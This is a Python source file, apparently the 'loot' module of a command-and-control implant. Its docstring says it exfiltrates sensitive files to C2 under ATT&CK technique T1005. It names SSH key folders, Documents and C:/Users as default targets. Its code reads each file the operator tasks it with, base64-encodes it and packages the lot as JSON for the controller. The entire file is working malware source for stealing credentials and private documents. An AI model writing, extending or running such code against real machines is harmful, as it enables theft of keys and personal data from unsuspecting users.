"""
Agent loot module — exfiltrates sensitive files to C2.
T1005: Data from Local System
"""
from __future__ import annotations

import base64
from pathlib import Path

# Interesting targets on a Windows host
_DEFAULT_TARGETS = [
    Path.home() / ".ssh",
    Path.home() / "Documents",
    Path("C:/Users") ,
]


def _collect(paths: list[str]) -> dict[str, str]:
    collected = {}
    for p_str in paths:
        p = Path(p_str)
        if p.is_file() and p.stat().st_size < 5 * 1024 * 1024:  # cap at 5 MB
            try:
                collected[str(p)] = base64.b64encode(p.read_bytes()).decode()
            except PermissionError:
                pass
    return collected


def run(task: dict) -> str:
    paths = task.get("paths", [])
    if not paths:
        return "no paths specified"
    files = _collect(paths)
    import json
    return json.dumps(files)
